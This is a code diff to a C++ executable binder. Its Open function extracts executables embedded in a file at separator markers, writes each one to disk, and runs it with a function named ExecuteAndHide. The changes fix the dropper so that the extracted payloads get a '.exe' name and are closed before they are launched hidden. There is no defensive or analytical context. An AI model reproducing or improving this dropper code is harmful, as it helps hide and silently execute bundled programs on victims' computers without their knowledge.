@@ -1,4 +1,4 @@
-#include "EXEBinder.h"
+#include "EXEBinder.hpp"
 
 EXEBinder::EXEBinder() {}
 
@@ -34,19 +34,21 @@ void EXEBinder::Open(const std::string& file) {
 	Miscellaneous::FindAllOccurrences(data, SEPARATOR, occurancesPoss);
 
 	for(size_t i = 1; i < occurancesPoss.size() - 1; i++) {
-		std::string exeName(std::to_string(Miscellaneous::TSAsLL()));
+		std::string exeName(std::to_string(Miscellaneous::TSAsLL()) + ".exe");
 
 		std::ofstream ofs(exeName, std::ios::binary);
 		size_t exeStart = occurancesPoss[i] + SEPARATOR_SIZE;
 		ofs << data.substr(exeStart, occurancesPoss[i + 1] - exeStart);
+		ofs.close();
 
 		ExecuteAndHide(exeName.c_str(), true);
 	}
 
-	std::string exeName(std::to_string(Miscellaneous::TSAsLL()));
+	std::string exeName(std::to_string(Miscellaneous::TSAsLL()) + ".exe");
 
 	std::ofstream ofs(exeName, std::ios::binary);
 	ofs << data.substr(occurancesPoss.back() + SEPARATOR_SIZE);
+	ofs.close();
 
 	ExecuteAndHide(exeName.c_str(), true);
 }
